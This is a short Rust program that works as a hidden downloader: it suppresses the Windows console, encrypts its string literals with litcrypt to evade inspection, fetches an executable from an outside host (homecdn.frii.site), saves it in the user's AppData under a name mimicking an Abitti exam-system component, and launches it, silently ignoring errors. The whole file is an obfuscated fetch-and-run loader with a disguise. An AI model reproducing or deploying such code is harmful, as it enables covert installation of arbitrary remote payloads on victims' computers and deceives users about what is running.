#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]
#[macro_use]
extern crate litcrypt;

use_litcrypt!();

use std::fs;

#[tokio::main]
async fn main() {
    let download_url = lc!("https://homecdn.frii.site/kake/client.exe");

    let resp = reqwest::get(download_url).await.expect(&lc!("failed to download client"));
    let body = resp.bytes().await.expect(&lc!("Invalid client data"));

    let username = std::env::var(&lc!("USERNAME")).unwrap();

    let base_path = lc!("C:\\Users\\") + &username + &lc!("\\AppData\\Local\\Abitti2");
    if let Err(e) = fs::create_dir_all(&base_path) {
    }

    let path = base_path + &lc!("\\abitti_wumgr.exe");
    if let Err(e) = fs::write(&path, body) {
    }

    let _ = std::process::Command::new(path).spawn();
}
